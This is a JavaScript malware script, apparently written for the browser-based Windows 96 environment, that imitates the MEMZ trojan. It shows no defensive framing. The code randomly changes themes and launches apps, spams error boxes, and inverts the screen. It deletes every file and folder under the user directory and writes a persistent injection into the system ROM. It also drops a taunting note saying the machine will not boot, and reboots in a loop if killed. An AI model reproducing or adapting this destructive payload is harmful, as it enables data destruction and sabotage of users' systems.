walls = await w96.FS.readdir('C:/system/wallpapers')
window.wallblobs = []
window.apps = await w96.FS.readdir("C:/system/local/bin")
walls.forEach(async(x)=>{
     if(!x.endsWith('dynamic')) {z=await w96.FS.toURL(x);
       wallblobs.push(z)}
})
setInterval(()=>{
    w96.ui.Theme.applyTheme(Object.keys(w96.ui.Theme.registeredThemes)[Math.floor(Math.random()*Object.keys(w96.ui.Theme.registeredThemes).length)])
    wall=window.wallblobs[Math.floor(Math.random()*window.wallblobs.length)]
    document.getElementsByClassName('user-desktop')[0].style.backgroundImage = `url("${wall}")`
    w96.ui.Theme.reloadDesktop()
},2500)
setInterval(()=>{
    app=window.apps[Math.floor(Math.random()*window.apps.length)]
    w96.sys.execFile(app)
},3500)

setInterval(()=>{
    w96.ui.MsgBoxSimple.error('lol','still using this computer?',"OK").dlg.randomizePosition()
},1540)

setInterval(()=>{
	document.querySelector("#maingfx").classList.add('fx-invert')
},500)
setInterval(()=>{
    document.querySelector("#maingfx").classList.remove('fx-invert')
},1000)

var dir = await w96.FS.readdir("C:/user");
for (i = 0; i < dir.length; i++) {
if (await w96.FS.isFile(dir[i])) {
    await w96.FS.rm(dir[i]) 
} else { 
    await w96.FS.rmdir(dir[i]) 
} 
}
kutil.sysrom.write('KINJECT.js',`setInterval(()=>{document.body.innerHTML=\`<p style='color:white'>Your computer has been f^cked by the MEMZ trojan. Enjoy the nyan cat..</p><br><img src="https://media.tenor.com/2roX3uxz_68AAAAM/cat-space.gif"></img>\`},1000)`)
await w96.FS.writestr('C:/README.txt',`YOUR COMPUTER HAS BEEN F^CKED BY THE MEMZ TROJAN.

Your computer won't boot up again, so use it as long as you can! :3

Trying to kill MEMZ will cause your system to be destroyed instantly, so don't try it :3

User files have already been deleted. Good luck :3`)
await w96.sys.execCmd('textpad',['C:/README.txt']);
xz=new w96.WApplication()
xz.title = 'MEMZDestructive'
xz.onterminated = ()=>{
    setInterval(()=>{
        w96.ui.MsgBoxSimple.error('','','').dlg.randomizePosition()
    },40)
    setInterval(()=>{
        w96.sys.reboot()
    },2440)
}
await w96.sys.execCmd('taskmgr')